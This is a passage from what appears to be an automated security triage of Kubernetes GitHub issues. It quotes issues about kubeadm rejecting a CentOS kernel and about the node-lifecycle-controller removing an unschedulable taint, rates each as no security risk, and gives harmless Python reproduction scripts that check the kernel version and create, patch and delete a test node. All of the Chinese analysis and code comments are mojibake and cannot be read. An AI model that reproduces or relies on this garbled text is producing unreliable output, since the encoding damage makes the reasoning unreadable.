    *   å¦‚æœæœªæ‰¾åˆ°ï¼Œæˆ–è€…åœ¨è·å–æ—¥å¿—æ—¶å› æƒé™ä¸è¶³ï¼ˆHTTP 403 Forbiddenï¼‰è€Œå¤±è´¥ï¼Œè„šæœ¬ä¼šæ‰“å°å‡ºæ¸…æ™°çš„è­¦å‘Šå’Œæ•…éšœæ’æŸ¥æç¤ºï¼Œå‘ŠçŸ¥ç”¨æˆ·å¯èƒ½çš„åŸå› ä»¥åŠå¦‚ä½•æˆäºˆæ‰€éœ€çš„ RBAC æƒé™ã€‚
6.  **èµ„æºæ¸…ç†**ï¼šåœ¨è„šæœ¬çš„ `finally` å—ä¸­ï¼Œæ— è®ºæ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„ `poc-cfs-logspam-pod`ï¼Œä»¥ä¿æŒé›†ç¾¤ç¯å¢ƒçš„æ•´æ´ã€‚
7.  **è¶…æ—¶æ§åˆ¶**ï¼šè„šæœ¬å†…ç½®äº†ä¸€ä¸ª120ç§’çš„è¶…æ—¶æœºåˆ¶ï¼Œç¡®ä¿å…¶ä¸ä¼šå› ç½‘ç»œé—®é¢˜æˆ–é›†ç¾¤å¼‚å¸¸è€Œæ°¸ä¹…æŒ‚èµ·ï¼Œä¿è¯åœ¨é™å®šæ—¶é—´å†…é€€å‡ºã€‚

é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œè¯¥è„šæœ¬æœ‰æ•ˆåœ°åœ¨å…¼å®¹çš„ Kubernetes ç¯å¢ƒä¸­é‡ç°äº† Issue æ‰€æè¿°çš„æ—¥å¿—è¡Œä¸ºã€‚

---


## Issue #131898 kubeadm fails with SystemVerification preflight error on CentOS

- Issue é“¾æ¥ï¼š[#131898](https://github.com/kubernetes/kubernetes/issues/131898)

### Issue å†…å®¹

#### What happened?

```
$ ./_output/bin/kubeadm init
[init] Using Kubernetes version: v1.33.1
[preflight] Running pre-flight checks
[preflight] The system verification failed. Printing the output from the verification:
KERNEL_VERSION: 5.14.0-585.el9.ppc64le
CONFIG_NAMESPACES: enabled
CONFIG_NET_NS: enabled
CONFIG_PID_NS: enabled
CONFIG_IPC_NS: enabled
CONFIG_UTS_NS: enabled
CONFIG_CGROUPS: enabled
CONFIG_CGROUP_BPF: enabled
CONFIG_CGROUP_CPUACCT: enabled
CONFIG_CGROUP_DEVICE: enabled
CONFIG_CGROUP_FREEZER: enabled
CONFIG_CGROUP_PIDS: enabled
CONFIG_CGROUP_SCHED: enabled
CONFIG_CPUSETS: enabled
CONFIG_MEMCG: enabled
CONFIG_INET: enabled
CONFIG_EXT4_FS: enabled (as module)
CONFIG_PROC_FS: enabled
CONFIG_NETFILTER_XT_TARGET_REDIRECT: enabled (as module)
CONFIG_NETFILTER_XT_MATCH_COMMENT: enabled (as module)
CONFIG_FAIR_GROUP_SCHED: enabled
CONFIG_OVERLAY_FS: enabled (as module)
CONFIG_AUFS_FS: not set - Required for aufs.
CONFIG_BLK_DEV_DM: enabled (as module)
CONFIG_CFS_BANDWIDTH: enabled
CONFIG_CGROUP_HUGETLB: enabled
CONFIG_SECCOMP: enabled
CONFIG_SECCOMP_FILTER: enabled
OS: Linux
CGROUPS_CPU: enabled
CGROUPS_CPUSET: enabled
CGROUPS_DEVICES: enabled
CGROUPS_FREEZER: enabled
CGROUPS_MEMORY: enabled
CGROUPS_PIDS: enabled
CGROUPS_HUGETLB: enabled
CGROUPS_IO: enabled
	[WARNING Hostname]: hostname "vllm-build-mkumatag.pokprv.stglabs.ibm.com" could not be reached
	[WARNING Hostname]: hostname "vllm-build-mkumatag.pokprv.stglabs.ibm.com": lookup vllm-build-mkumatag.pokprv.stglabs.ibm.com on 10.0.10.4:53: no such host
error execution phase preflight: [preflight] Some fatal errors occurred:
	[ERROR SystemVerification]: kernel release 5.14.0-585.el9.ppc64le is unsupported. Supported LTS versions from the 5.x series are 5.4, 5.10 and 5.15. Any 6.x version is also supported. For cgroups v2 support, the recommended version is 5.10 or newer
[preflight] If you know what you are doing, you can make a check non-fatal with `--ignore-preflight-errors=...`
To see the stack trace of this error execute with --v=5 or higher
$
```

#### What did you expect to happen?

kubeadm init should go through

#### How can we reproduce it (as minimally and precisely as possible)?

- Build latest kubeadm binary from master kubernetes
- run the `kubeadm init`

#### Anything else we need to know?

Since CentOS and Red Hat use different kernel versions compared to those listed on https://endoflife.date/linux, it would be better to either include the currently supported kernel versions for CentOS/RHEL or relax the version check accordingly.

<img width="663" alt="Image" src="https://github.com/user-attachments/assets/18352057-a5a4-4ab6-94ee-b3d18ad2ebc3" />


#### Kubernetes version

<details>

```console
$ ./_output/bin/kubeadm version
kubeadm version: &version.Info{Major:"1", Minor:"34+", EmulationMajor:"", EmulationMinor:"", MinCompatibilityMajor:"", MinCompatibilityMinor:"", GitVersion:"v1.34.0-alpha.0.740+8f5a33768a388d-dirty", GitCommit:"8f5a33768a388db03c0b50480bc0d5a134a78ef2", GitTreeState:"dirty", BuildDate:"2025-05-22T07:33:17Z", GoVersion:"go1.24.2", Compiler:"gc", Platform:"linux/ppc64le"}
```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="CentOS Stream"
VERSION="9"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="9"
PLATFORM_ID="platform:el9"
PRETTY_NAME="CentOS Stream 9"
ANSI_COLOR="0;31"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:centos:centos:9"
HOME_URL="https://centos.org/"
BUG_REPORT_URL="https://issues.redhat.com/"
REDHAT_SUPPORT_PRODUCT="Red Hat Enterprise Linux 9"
REDHAT_SUPPORT_PRODUCT_VERSION="CentOS Stream"

$ uname -a
Linux vllm-build-mkumatag.pokprv.stglabs.ibm.com 5.14.0-585.el9.ppc64le #1 SMP Wed May 14 18:20:21 UTC 2025 ppc64le ppc64le ppc64le GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
NA
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
NA
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº† `kubeadm init` å‘½ä»¤åœ¨ CentOS Stream 9 ç³»ç»Ÿä¸Šæ‰§è¡Œå¤±è´¥çš„é—®é¢˜ã€‚å¤±è´¥å‘ç”Ÿåœ¨é¢„æ£€ï¼ˆpreflightï¼‰é˜¶æ®µï¼Œå…·ä½“çš„é”™è¯¯ä¿¡æ¯æ˜¯ `[ERROR SystemVerification]: kernel release 5.14.0-585.el9.ppc64le is unsupported`ã€‚

é—®é¢˜æ ¹æºåœ¨äº `kubeadm` å†…éƒ¨æœ‰ä¸€ä¸ªç¡¬ç¼–ç çš„æ”¯æŒçš„ Linux å†…æ ¸ç‰ˆæœ¬åˆ—è¡¨ã€‚ç”¨æˆ·ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬ `5.14.0-585.el9.ppc64le` ä¸åœ¨è¯¥åˆ—è¡¨ä¸­ï¼Œå› æ­¤ `kubeadm` ä¸ºäº†ç¡®ä¿ç¨³å®šæ€§å’Œå…¼å®¹æ€§ï¼Œä¸»åŠ¨ä¸­æ­¢äº†åˆå§‹åŒ–è¿‡ç¨‹ã€‚è¿™æ˜¯ä¸€ä¸ªè®¾è®¡ä¸Šçš„å®‰å…¨å’Œç¨³å®šæ€§ä¿éšœæªæ–½ï¼Œè€Œéä¸€ä¸ªå¯è¢«åˆ©ç”¨çš„æ¼æ´ã€‚

ç¨‹åºæ˜ç¡®åœ°æŒ‡å‡ºäº†é—®é¢˜æ‰€åœ¨ï¼Œå¹¶æä¾›äº†ç»•è¿‡æ­¤æ£€æŸ¥çš„å‚æ•° `--ignore-preflight-errors`ï¼Œè¿™è¡¨æ˜å¼€å‘è€…å·²ç»é¢„è§åˆ°äº†æ­¤ç±»æƒ…å†µã€‚è¿™ç§è¡Œä¸ºæ˜¯é¢„æœŸçš„ï¼Œæ—¨åœ¨é˜²æ­¢ç”¨æˆ·åœ¨æœªç»å®˜æ–¹æµ‹è¯•å’Œæ”¯æŒçš„ç¯å¢ƒä¸­è¿è¡Œ Kubernetesï¼Œä»è€Œé¿å…æ½œåœ¨çš„æœªçŸ¥é—®é¢˜ã€‚

Issue ä¸­è¿˜æåˆ°äº†ä¸€ä¸ªä¸»æœºåæ— æ³•è§£æçš„è­¦å‘Š `[WARNING Hostname]`ï¼Œè¿™æ˜¯ç”¨æˆ·æœ¬åœ°ç¯å¢ƒçš„ DNS é…ç½®é—®é¢˜ï¼Œä¸ `kubeadm` é¡¹ç›®æœ¬èº«çš„å®‰å…¨æ— å…³ï¼Œå±äº issue æäº¤è€…çš„ç¯å¢ƒé…ç½®é—®é¢˜ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥ Issue æŠ¥å‘Šçš„æ˜¯ä¸€ä¸ªå…¼å®¹æ€§é—®é¢˜ï¼Œæ˜¯ `kubeadm` çš„ä¸€ä¸ªé¢„é˜²æ€§æ£€æŸ¥æœºåˆ¶åœ¨èµ·ä½œç”¨ï¼Œä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import platform
import re
import sys

# æ¨¡æ‹Ÿ kubeadm æ”¯æŒçš„å†…æ ¸ç‰ˆæœ¬åˆ—è¡¨ (åŸºäº issue æè¿°)
# "Supported LTS versions from the 5.x series are 5.4, 5.10 and 5.15. Any 6.x version is also supported."
SUPPORTED_LTS_VERSIONS = ["5.4", "5.10", "5.15"]

def check_kernel_version_supported(kernel_version):
    """
    æ¨¡æ‹Ÿ kubeadm æ£€æŸ¥å†…æ ¸ç‰ˆæœ¬æ˜¯å¦å—æ”¯æŒçš„é€»è¾‘ã€‚
    """
    # æ£€æŸ¥æ˜¯å¦ä¸º 6.x æˆ–æ›´é«˜ç‰ˆæœ¬
    if kernel_version.startswith("6."):
        return True, f"Kernel version {kernel_version} is supported (6.x series)."

    # æ£€æŸ¥æ˜¯å¦ä¸ºæ”¯æŒçš„ 5.x LTS ç‰ˆæœ¬
    for lts_version in SUPPORTED_LTS_VERSIONS:
        if kernel_version.startswith(lts_version + "."):
            return True, f"Kernel version {kernel_version} is supported (LTS version {lts_version})."
    
    # æ£€æŸ¥æ˜¯å¦ä¸º 5.x ç³»åˆ—ä½†ä¸æ˜¯æ”¯æŒçš„ LTS
    if kernel_version.startswith("5."):
        return False, f"kernel release {kernel_version} is unsupported. Supported LTS versions from the 5.x series are {', '.join(SUPPORTED_LTS_VERSIONS)}."
    
    # å…¶ä»–æƒ…å†µå‡è§†ä¸ºä¸æ”¯æŒ
    return False, f"kernel release {kernel_version} is unsupported."


def simulate_kubeadm_preflight_check():
    """
    ä¸»å‡½æ•°ï¼Œæ¨¡æ‹Ÿ kubeadm çš„é¢„æ£€è¿‡ç¨‹ã€‚
    """
    print("[preflight] Running pre-flight checks")
    
    try:
        # è·å–å½“å‰ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬
        current_kernel_version = platform.release()
        print(f"OS: {platform.system()}")
        print(f"KERNEL_VERSION: {current_kernel_version}")

        # è¿›è¡Œç‰ˆæœ¬æ£€æŸ¥
        is_supported, message = check_kernel_version_supported(current_kernel_version)

        if not is_supported:
            print("[preflight] The system verification failed. Printing the output from the verification:")
            print(f"\t[ERROR SystemVerification]: {message}")
            print("[preflight] If you know what you are doing, you can make a check non-fatal with `--ignore-preflight-errors=...`")
            sys.exit(1) # ä»¥éé›¶çŠ¶æ€ç é€€å‡ºï¼Œè¡¨ç¤ºå¤±è´¥
        else:
            print("[preflight] System verification passed.")
            print(message)
            print("[init] ... continuing with initialization ...")

    except Exception as e:
        print(f"An error occurred during preflight check: {e}")
        sys.exit(1)


# æ‰§è¡Œæ¨¡æ‹Ÿ
simulate_kubeadm_preflight_check()
```


---


## Issue #131878 kubelet use --register-with-taints=node.kubernetes.io/unschedulable=true:NoSchedule wiil be remove by node-lifecycle-controller if  node.spec.Unscheduleable=false

- Issue é“¾æ¥ï¼š[#131878](https://github.com/kubernetes/kubernetes/issues/131878)

### Issue å†…å®¹

#### What happened?

When `node.spec.Unschedulable = false`, the `node-lifecycle-controller` will automatically remove the `node.kubernetes.io/unschedulable=true:NoSchedule` taint from the node.

Most of the time, this mechanism works well. However, sometimes I want the node to be registered with this taint by default, and only remove it manually when I decide to, instead of having it removed automatically by the `node-lifecycle-controller`.

In this case, maybe I need to add `--register-schedulable=false --register-with-taints=node.kubernetes.io/unschedulable=true:NoSchedule` to the kubelet startup configuration. Unfortunately, this flag(--register-schedulable) has been marked as deprecated, and I am not sure whether I should use it.

```go
        // registerSchedulable tells the kubelet to register the node as
	// schedulable. Won't have any effect if register-node is false.
	// DEPRECATED: use registerWithTaints instead
	RegisterSchedulable bool
```


#### What did you expect to happen?

I expect that the `node.kubernetes.io/unschedulable=true:NoSchedule` taint added when registering the node will not be automatically removed by the `node-lifecycle-controller`.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create a node and configure kubelet with `--register-with-taints=node.kubernetes.io/unschedulable=true:NoSchedule`.
2. Check the node's taints; it does **not** include this taint.

#### Anything else we need to know?

I set the log level of` kube-controller-manager` to 4, and I was able to observe that the taint was indeed removed by the `node-lifecycle-controller`.

```shell
I0521 11:21:46.172081       7 controller_utils.go:223] "Made sure that node has no taint" node="192.168.0.200" taint=[{"key":"node.kubernetes.io/unschedulable","value":"true","effect":"NoSchedule"}]
```

#### Kubernetes version

<details>

[root@192-168-0-131 paas]# kubectl version
Client Version: v1.31.6-r0-31.0.3-arm64
Kustomize Version: v5.4.2
Server Version: v1.31.6

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº† Kubernetes ä¸­ä¸€ä¸ªå…³äºèŠ‚ç‚¹ï¼ˆNodeï¼‰æ³¨å†Œå’Œæ±¡ç‚¹ï¼ˆTaintï¼‰ç®¡ç†çš„è¡Œä¸ºã€‚ç”¨æˆ·é€šè¿‡ Kubelet çš„å¯åŠ¨å‚æ•° `--register-with-taints` ä¸ºæ–°æ³¨å†Œçš„èŠ‚ç‚¹æ·»åŠ äº†ä¸€ä¸ª `node.kubernetes.io/unschedulable=true:NoSchedule` çš„æ±¡ç‚¹ï¼ŒæœŸæœ›è¿™ä¸ªèŠ‚ç‚¹åœ¨åŠ å…¥é›†ç¾¤åæ˜¯ä¸å¯è°ƒåº¦çš„ã€‚ç„¶è€Œï¼Œç”¨æˆ·è§‚å¯Ÿåˆ° `kube-controller-manager` ä¸­çš„ `node-lifecycle-controller` ä¼šè‡ªåŠ¨ç§»é™¤è¿™ä¸ªæ±¡ç‚¹ã€‚

è¿™ä¸ªç°è±¡çš„æ ¹æœ¬åŸå› æ˜¯ `node-lifecycle-controller` çš„è®¾è®¡æœºåˆ¶ã€‚è¯¥æ§åˆ¶å™¨çš„ä¸€ä¸ªæ ¸å¿ƒèŒè´£æ˜¯åŒæ­¥èŠ‚ç‚¹çš„ `spec.unschedulable` å­—æ®µå’Œ `node.kubernetes.io/unschedulable` è¿™ä¸ªç‰¹å®šçš„æ±¡ç‚¹ã€‚
1.  å½“ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¥åº·çš„å¹¶ä¸”å…¶ `spec.unschedulable` å­—æ®µä¸º `false`ï¼ˆé»˜è®¤å€¼ï¼‰æ—¶ï¼Œ`node-lifecycle-controller` ä¼šç¡®ä¿è¯¥èŠ‚ç‚¹ä¸Šæ²¡æœ‰ `node.kubernetes.io/unschedulable` æ±¡ç‚¹ã€‚å¦‚æœæ£€æµ‹åˆ°è¯¥æ±¡ç‚¹å­˜åœ¨ï¼Œæ§åˆ¶å™¨ä¼šå°†å…¶ç§»é™¤ï¼Œä»¥ä¿è¯èŠ‚ç‚¹çš„å®é™…å¯è°ƒåº¦çŠ¶æ€ä¸ `spec` ä¸­å£°æ˜çš„çŠ¶æ€ä¸€è‡´ã€‚
2.  åä¹‹ï¼Œå½“ä¸€ä¸ªèŠ‚ç‚¹è¢«è®¾ç½®ä¸ºä¸å¯è°ƒåº¦ï¼ˆä¾‹å¦‚é€šè¿‡ `kubectl cordon` å‘½ä»¤ï¼Œè¿™ä¼šè®¾ç½® `spec.unschedulable=true`ï¼‰ï¼Œ`node-lifecycle-controller` ä¼šè‡ªåŠ¨ä¸ºè¯¥èŠ‚ç‚¹æ·»åŠ  `node.kubernetes.io/unschedulable` æ±¡ç‚¹ã€‚

Issue ä¸­æè¿°çš„è¡Œä¸ºæ­£æ˜¯è¿™ç§è®¾è®¡æœºåˆ¶çš„ä½“ç°ã€‚å°½ç®¡ Kubelet åœ¨æ³¨å†Œæ—¶æ·»åŠ äº†æ±¡ç‚¹ï¼Œä½†ç”±äºèŠ‚ç‚¹çš„ `spec.unschedulable` é»˜è®¤ä¸º `false`ï¼Œ`node-lifecycle-controller` åœ¨å…¶åè°ƒå¾ªç¯ä¸­å‘ç°äº†è¿™ç§â€œä¸ä¸€è‡´â€ï¼Œå¹¶é‡‡å–äº†çº æ­£æªæ–½ï¼Œå³ç§»é™¤äº†æ±¡ç‚¹ã€‚

è¿™å¹¶éä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯ä¸€ä¸ªé¢„æœŸçš„ã€ä¸ºäº†ä¿è¯é›†ç¾¤çŠ¶æ€ä¸€è‡´æ€§çš„åŠŸèƒ½ç‰¹æ€§ã€‚ç”¨æˆ·é‡åˆ°çš„é—®é¢˜æ˜¯å…¶æœŸæœ›çš„æ“ä½œæ–¹å¼ä¸ Kubernetes çš„å†…ç½®æ§åˆ¶å™¨é€»è¾‘ä¹‹é—´å­˜åœ¨å†²çªã€‚è¿™å±äºé…ç½®ç®¡ç†æˆ–å¯¹ç³»ç»Ÿè¡Œä¸ºç†è§£ä¸Šçš„é—®é¢˜ï¼Œä¸æ„æˆå®‰å…¨é£é™©ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤è¡Œä¸ºè¿›è¡Œæƒé™æå‡ã€æ•°æ®æ³„éœ²æˆ–æœåŠ¡æ‹’ç»ã€‚è¯¥è¡Œä¸ºæ˜¯ç”±é«˜æƒé™çš„ `kube-controller-manager` ç»„ä»¶æ‰§è¡Œçš„ï¼Œå¤–éƒ¨æˆ–ä½æƒé™ç”¨æˆ·æ— æ³•è§¦å‘æˆ–åˆ©ç”¨å®ƒæ¥ç ´åé›†ç¾¤ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import string
import random
from kubernetes import client, config, watch
from kubernetes.client.rest import ApiException

def generate_random_name(prefix="poc-node-test"):
    """ç”Ÿæˆä¸€ä¸ªéšæœºèŠ‚ç‚¹åç§°"""
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{prefix}-{suffix}"

def demonstrate_taint_removal():
    """
    æ¼”ç¤º node-lifecycle-controller è‡ªåŠ¨ç§»é™¤ unschedulable æ±¡ç‚¹çš„è¡Œä¸º
    """
    try:
        config.load_kube_config()
    except config.ConfigException:
        print("æ— æ³•åŠ è½½ kubeconfig æ–‡ä»¶ï¼Œè¯·ç¡®ä¿è¯¥æ–‡ä»¶å­˜åœ¨äºé»˜è®¤ä½ç½®æˆ–å·²è®¾ç½® KUBECONFIG ç¯å¢ƒå˜é‡ã€‚")
        return

    core_v1 = client.CoreV1Api()
    node_name = generate_random_name()

    print(f"å°†è¦åˆ›å»ºä¸€ä¸ªåä¸º '{node_name}' çš„è™šæ‹ŸèŠ‚ç‚¹...")

    # å®šä¹‰ä¸€ä¸ªå¸¦æœ‰ unschedulable æ±¡ç‚¹çš„èŠ‚ç‚¹
    # æ³¨æ„ï¼šspec.unschedulable é»˜è®¤ä¸º Falseï¼Œæˆ‘ä»¬åœ¨æ­¤ä¸è®¾ç½®å®ƒï¼Œä»¥æ¨¡æ‹Ÿ issue ä¸­çš„åœºæ™¯
    node_body = client.V1Node(
        api_version="v1",
        kind="Node",
        metadata=client.V1ObjectMeta(name=node_name),
        spec=client.V1NodeSpec(
            taints=[
                client.V1Taint(
                    key="node.kubernetes.io/unschedulable",
                    effect="NoSchedule"
                )
            ]
        )
    )

    try:
        # 1. åˆ›å»ºèŠ‚ç‚¹
        print(f"æ­¥éª¤ 1: åˆ›å»ºå¸¦æœ‰ 'unschedulable' æ±¡ç‚¹çš„èŠ‚ç‚¹ '{node_name}'...")
        core_v1.create_node(body=node_body)
        print(f"èŠ‚ç‚¹ '{node_name}' å·²åˆ›å»ºï¼Œåˆå§‹æ±¡ç‚¹å­˜åœ¨ã€‚")

        # 2. æ›´æ–°èŠ‚ç‚¹çŠ¶æ€ä¸º Ready
        # è¿™æ˜¯æ¨¡æ‹Ÿ kubelet æ±‡æŠ¥èŠ‚ç‚¹å¥åº·çŠ¶æ€çš„å…³é”®ä¸€æ­¥
        # node-lifecycle-controller ä¸»è¦å…³æ³¨çŠ¶æ€ä¸º Ready çš„èŠ‚ç‚¹
        status_body = {
            "status": {
                "conditions": [
                    {
                        "type": "Ready",
                        "status": "True",
                        "lastHeartbeatTime": client.V1Time.now().isoformat() + "Z",
                        "lastTransitionTime": client.V1Time.now().isoformat() + "Z",
                        "reason": "KubeletReady",
                        "message": "kubelet is posting ready status"
                    }
                ]
            }
        }
        print("æ­¥éª¤ 2: å°†èŠ‚ç‚¹çŠ¶æ€æ›´æ–°ä¸º 'Ready'ï¼Œä»¥æ¨¡æ‹Ÿå¥åº·çš„ Kubelet...")
        core_v1.patch_node_status(name=node_name, body=status_body)
        print("èŠ‚ç‚¹çŠ¶æ€å·²æ›´æ–°ã€‚")

        # 3. è§‚å¯Ÿæ±¡ç‚¹æ˜¯å¦è¢«ç§»é™¤
        print("æ­¥éª¤ 3: ç›‘æ§èŠ‚ç‚¹ï¼Œç­‰å¾… 'node-lifecycle-controller' ç§»é™¤æ±¡ç‚¹...")
        print("è¿™å¯èƒ½éœ€è¦å‡ åç§’åˆ°ä¸€åˆ†é’Ÿçš„æ—¶é—´...")

        timeout = 120  # 2åˆ†é’Ÿè¶…æ—¶
        start_time = time.time()
        taint_removed = False

        while time.time() - start_time < timeout:
            try:
                node = core_v1.read_node(name=node_name)
                current_taints = node.spec.taints if node.spec.taints else []
                
                # æ£€æŸ¥ unschedulable æ±¡ç‚¹æ˜¯å¦è¿˜å­˜åœ¨
                found_taint = any(
                    taint.key == "node.kubernetes.io/unschedulable" for taint in current_taints
                )

                if not found_taint:
                    print(f"\n[æˆåŠŸ] 'node.kubernetes.io/unschedulable' æ±¡ç‚¹å·²è¢«ç§»é™¤ï¼")
                    print(f"å¤ç°äº† Issue ä¸­æè¿°çš„ç°è±¡ã€‚")
                    taint_removed = True
                    break
                else:
                    print(".", end="", flush=True)

            except ApiException as e:
                print(f"è¯»å–èŠ‚ç‚¹æ—¶å‡ºé”™: {e}")
                break
            time.sleep(5)

        if not taint_removed:
            print("\n[è¶…æ—¶] åœ¨2åˆ†é’Ÿå†…æœªè§‚å¯Ÿåˆ°æ±¡ç‚¹è¢«ç§»é™¤ã€‚")
            print("å¯èƒ½åŸå› ï¼šé›†ç¾¤ä¸­ node-lifecycle-controller çš„åŒæ­¥å‘¨æœŸè¾ƒé•¿ï¼Œæˆ–è€…æƒé™ä¸è¶³ã€‚")

    except ApiException as e:
        print(f"æ“ä½œå¤±è´¥: {e.status} - {e.reason}")
        print(f"Body: {e.body}")
    finally:
        # 4. æ¸…ç†èµ„æº
        print("\næ­¥éª¤ 4: æ¸…ç†åˆ›å»ºçš„è™šæ‹ŸèŠ‚ç‚¹...")
        try:
            core_v1.delete_node(name=node_name)
            print(f"èŠ‚ç‚¹ '{node_name}' å·²è¢«åˆ é™¤ã€‚")
        except ApiException as e:
            # å¦‚æœèŠ‚ç‚¹ä¸å­˜åœ¨æˆ–å·²åˆ é™¤ï¼Œå¿½ç•¥é”™è¯¯
            if e.status != 404:
                print(f"æ¸…ç†èŠ‚ç‚¹ '{node_name}' å¤±è´¥: {e}")

# ç›´æ¥æ‰§è¡Œä¸»å‡½æ•°
demonstrate_taint_removal()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬çš„ä½œç”¨æ˜¯æ¨¡æ‹Ÿå¹¶éªŒè¯ Issue ä¸­æè¿°çš„ Kubernetes æ ¸å¿ƒè¡Œä¸ºã€‚å®ƒä¸åˆ©ç”¨ä»»ä½•å®‰å…¨æ¼æ´ã€‚

1.  **ç¯å¢ƒå‡†å¤‡**: è„šæœ¬é¦–å…ˆä½¿ç”¨ `kubernetes` Python åº“åŠ è½½æœ¬åœ°çš„ `kubeconfig` æ–‡ä»¶ï¼Œä»¥è·å–ä¸ Kubernetes é›†ç¾¤é€šä¿¡çš„æƒé™ã€‚æ‰§è¡Œæ­¤è„šæœ¬éœ€è¦é›†ç¾¤ç®¡ç†å‘˜çº§åˆ«çš„æƒé™ï¼Œå› ä¸ºå®ƒéœ€è¦åˆ›å»º Node å¯¹è±¡ã€‚
2.  **åˆ›å»ºè™šæ‹ŸèŠ‚ç‚¹**: è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª `V1Node` å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡çš„ `spec` ä¸­æ˜ç¡®åŒ…å«äº† `node.kubernetes.io/unschedulable` æ±¡ç‚¹ï¼Œè¿™æ¨¡æ‹Ÿäº† Kubelet å¯åŠ¨æ—¶ `--register-with-taints` çš„æ•ˆæœã€‚èŠ‚ç‚¹çš„ `spec.unschedulable` å­—æ®µä¿æŒé»˜è®¤å€¼ `False`ã€‚
3.  **æ¨¡æ‹ŸèŠ‚ç‚¹å°±ç»ª**: `node-lifecycle-controller` ä¸»è¦å¤„ç†çŠ¶æ€ä¸º `Ready` çš„èŠ‚ç‚¹ã€‚ä¸ºäº†è§¦å‘æ§åˆ¶å™¨çš„åè°ƒé€»è¾‘ï¼Œè„šæœ¬åœ¨åˆ›å»ºèŠ‚ç‚¹åï¼Œç«‹å³é€šè¿‡ `patch_node_status` æ–¹æ³•å°†èŠ‚ç‚¹çš„çŠ¶æ€æ›´æ–°ä¸º `Ready`ã€‚è¿™ä¸€æ­¥è‡³å…³é‡è¦ï¼Œå®ƒæ¨¡æ‹Ÿäº†ä¸€ä¸ªå¥åº·çš„ Kubelet å‘ API Server æ±‡æŠ¥å…¶çŠ¶æ€çš„è¿‡ç¨‹ã€‚
4.  **ç›‘æ§ä¸éªŒè¯**: è„šæœ¬è¿›å…¥ä¸€ä¸ªè½®è¯¢å¾ªç¯ï¼Œæ¯éš”5ç§’æ£€æŸ¥ä¸€æ¬¡è™šæ‹ŸèŠ‚ç‚¹çš„çŠ¶æ€ã€‚å®ƒæ£€æŸ¥ `spec.taints` åˆ—è¡¨ï¼Œåˆ¤æ–­ `node.kubernetes.io/unschedulable` æ±¡ç‚¹æ˜¯å¦å­˜åœ¨ã€‚
5.  **ç»“æœè¾“å‡º**:
    *   å¦‚æœè„šæœ¬æ£€æµ‹åˆ°è¯¥æ±¡ç‚¹è¢«ç§»é™¤äº†ï¼Œå®ƒä¼šæ‰“å°æˆåŠŸä¿¡æ¯ï¼Œè¯æ˜ `node-lifecycle-controller` ç¡®å®å¦‚ Issue æ‰€è¿°ï¼Œä¸ºäº†ä¸ `spec.unschedulable=False` çš„çŠ¶æ€ä¿æŒä¸€è‡´è€Œæ¸…é™¤äº†æ±¡ç‚¹ã€‚
    *   å¦‚æœè¶…è¿‡2åˆ†é’Ÿæ±¡ç‚¹ä»æœªè¢«ç§»é™¤ï¼Œè„šæœ¬ä¼šè¶…æ—¶é€€å‡ºã€‚
6.  **èµ„æºæ¸…ç†**: åœ¨è„šæœ¬çš„ `finally` å—ä¸­ï¼Œæ— è®ºæ‰§è¡ŒæˆåŠŸä¸å¦ï¼Œéƒ½ä¼šå°è¯•åˆ é™¤åˆ›å»ºçš„è™šæ‹ŸèŠ‚ç‚¹ï¼Œç¡®ä¿ä¸ç»™é›†ç¾¤ç•™ä¸‹åƒåœ¾èµ„æºã€‚

è¿™ä¸ªè„šæœ¬æ¸…æ™°åœ°å±•ç¤ºäº† Kubernetes æ§åˆ¶å¹³é¢å†…éƒ¨çš„çŠ¶æ€åè°ƒæœºåˆ¶ï¼Œè¯æ˜äº† Issue ä¸­æè¿°çš„ç°è±¡æ˜¯ç³»ç»Ÿè®¾è®¡çš„é¢„æœŸè¡Œä¸ºï¼Œè€Œéå®‰å…¨é—®é¢˜ã€‚

---


## Issue #131859 Fix bug in dependencies.yml file

- Issue é“¾æ¥ï¼š[#131859](https://github.com/kubernetes/kubernetes/issues/131859)

### Issue å†…å®¹

#### What happened?

I found this incorrect config in [build/dependencies.yml file](https://github.com/kubernetes/kubernetes/blob/d75a5811effebbb7ab3cb45aaaa2f3d5c3658d4f/build/dependencies.yaml#L259)

